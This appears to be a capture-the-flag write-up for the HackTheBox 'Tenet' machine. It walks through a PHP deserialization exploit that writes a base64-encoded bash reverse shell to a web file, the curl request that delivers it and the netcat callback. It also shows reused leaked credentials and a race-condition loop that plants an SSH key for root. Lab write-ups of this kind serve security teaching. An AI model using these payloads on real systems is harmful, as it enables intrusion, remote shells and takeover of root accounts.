# Enumeration

Beginning this box as every box, with a `nmap` scan of the box to locate open ports.

```bash
$ sudo nmap -sC -sV -oA nmap/tenet 10.10.10.223
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-07 20:00 EDT

# Foothold
The box appears to have only two open ports (`80` and `22`). Visiting port `80`, it appears to be an Apache site, so then running `gobuster` on it locates an interesting directory:

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://10.10.10.223
...{snip}...
/wordpress (Status: 301}
...{snip}...
```

Visiting the `/wordpress` URL in Firefox gives a badly formatted Wordpress site, which looks like it's trying to add resources from `tenet.htb`. So we may add `10.10.10.223 tenet.htb` to our `/etc/hosts` file.

Browsing the site, I see a user `neil` posted a comment:
> did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!

So that's interesting, it sounds like there's a "sator" php file (maybe `sator.php`?). Visiting `http://tenet.htb/sator.php` gives a 404 error, but remembering from before, we're within the `/wordpress` directory, so what about `http://10.10.10.223/sator.php`? Success!!

This `sator.php` script is printing the following:

> [+] Grabbing users from text file  
> [] Database updated

The comment from neil on the Wordpress form mentioned a backup file, so accessing `http://10.10.10.223/sator.php.bak` and it exists!

```php
<?php

class DatabaseExport
{
        public $user_file = 'users.txt';
        public $data = '';

        public function update_db()
        {
                echo '[+] Grabbing users from text file <br>';
                $this-> data = 'Success';
        }


        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[] Database updated <br>';
        //      echo 'Gotta get this working properly...';
        }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>
```

Examining this PHP script, we may see that it is receiving user input via `arepo` variable, passing that to `unserialize`, then calling the `DatabaseExport` class. This looks like a classic example of PHP object deserialization. Basically, from my understanding, what is happening is that PHP will allow you to serialize a class and all of the data within it into a string which may then be deserialized back into a class. Then when the control flow exits, the `__destruct` function is called on it. In this example, the `__destruct` function writes the `data` value to `user_file`. [More on PHP deserialization may be read here](https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a).

Since we know the name of the class (`DatabaseExport`) as well as the variable names (`user_file` and `data`), we can construct a payload that is a deserialized PHP object that will allow us to write data out to an arbitrary output file of our choice.

For this payload, we will write out to a PHP file with a very basic reverse shell.

To begin with, the reverse shell that I'd like to attempt is the following:

```bash
/bin/bash -c 'bash -i > /dev/tcp/10.10.14.204/9000 0>&1'
```

Wrapping this in a PHP script to execute it, I get:

```php
<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.204/9000 0>&1'"); ?>
```

However, I forsee a problem here. Specifically the "&" character, which in a URL is treated as a special delimiter and might throw the payload off. So instead I'm going to base64 encode the reverse shell payload:

```bash
$ echo "/bin/bash -c 'bash -i > /dev/tcp/10.10.14.204/9000 0>&1'" | base64
L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTQuMjA0LzkwMDAgMD4mMScK
```

Then, use the `base64_decode` function in PHP to decode it before executing it:

```php
<?php exec(base64_decode("L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTQuMjA0LzkwMDAgMD4mMScK"));
```

So that's the payload I want to eventually write to a file.

Next up, I need to serialize that and put it into a proper payload that will deserialize correctly. For this, I'll construct the following payload:

```
O:14:"DatabaseExport":2:{s:9:"user_file";s:10:"rshell.php";s:4:"data";s:106:"<?php exec(base64_decode("L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTQuMjA0LzkwMDAgMD4mMScK"));";}
```

Above we begin with "O" (the letter Oh, not the number zero) to tell PHP that this is an object, followed by the length of the name (14) and the name ("DatabaseExport"). Next the "2" tells PHP that there are two elements in the next section. Within the section we use "s" to denote a string, then "9" for the length of the next string, which is the name of the variable, and the variable itself ("user_file"). Following that we have the same format to provide the variable contents ("rshell.php"). This is then repeated for the "data" variable to contain our payload.

If all goes well, this should generate a file named "rshell.php" which contains the payload to generate a reverse shell.

When using FireFox, the payload may be directly pasted in and FireFox will encode it. However, I like to be a little cautious and pre-encode before uploading.

```bash
$ hURL -U 'O:14:"DatabaseExport":2:{s:9:"user_file";s:10:"rshell.php";s:4:"data";s:106:"<?php exec(base64_decode("L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTQuMjA0LzkwMDAgMD4mMScK"));";}'

Original    :: O:14:"DatabaseExport":2:{s:9:"user_file";s:10:"rshell.php";s:4:"data";s:106:"<?php exec(base64_decode("L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTQuMjA0LzkwMDAgMD4mMScK"));";}
URL ENcoded :: O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A10%3A%22rshell.php%22%3Bs%3A4%3A%22data%22%3Bs%3A106%3A%22%3C%3Fphp%20exec%28base64_decode%28%22L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTQuMjA0LzkwMDAgMD4mMScK%22%29%29%3B%22%3B%7D
```

Now that we have the URL encoded payload, we may submit this via the PHP page.

```bash
$ curl 'http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A10%3A%22rshell.php%22%3Bs%3A4%3A%22data%22%3Bs%3A106%3A%22%3C%3Fphp%20exec%28base64_decode%28%22L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTQuMjA0LzkwMDAgMD4mMScK%22%29%29%3B%22%3B%7D' 
```

Setting up a netcat listener and visiting the page, we receive a successful callback.

```bash
$ nc -lnvp 9000
listening on [any] 9000 ...
connect to [10.10.14.204] from (UNKNOWN) [10.10.10.223] 29836
python3 -c "import pty; pty.spawn('/bin/bash')"
www-data@tenet:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@tenet:/var/www/html$
```

We've successfully logged in as the `www-data` user!

# Privesc

Now we need to enumerate and determine exactly what we can do. For this I ran `linpeas.sh` to locate anything useful, which found the MySQL login information

> Mysql Database: wordpress  
> Mysql User: neil  
> Mysql Pass: Opera2112

Quickly checking those credentials, the user `neil` has the same password for SSH, so we now have SSH access as `neil`.

An additional note is that the script `/usr/local/bin/enableSSH.sh` may be executed by `sudo` by all users. However, without the `www-data` password, that wasn't possible. But now that we have `neil`, that's possible.

Taking a closer look at the `enableSSH.sh` script, it appears to have a hardcoded SSH public key inside of it, it then writes that key to a temporary file, then echos that temporary file into `/root/.ssh/authorized_keys`. If we're able to somehow intercept that temporary file after it is created but before it is sent into the root SSH keys, we can inject our own key into it. This is basically a race condition.

To do this, we could use `python` since that's on the box, but it's also possible to do this with a simple bash script.

```bash
$ while true; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAA...AlU= kali@kali" | tee /tmp/ssh-* >/dev/null; done
```

The above will loop continuously and copy our SSH public key into the `/tmp/ssh-*` file path if/when it exists. This took a couple times before it successfully worked.

```bash
$ sudo /usr/local/bin/enableSSH.sh
```

After executing the above a few times to make sure that the SSH key has made it in, we can then SSH in as root!
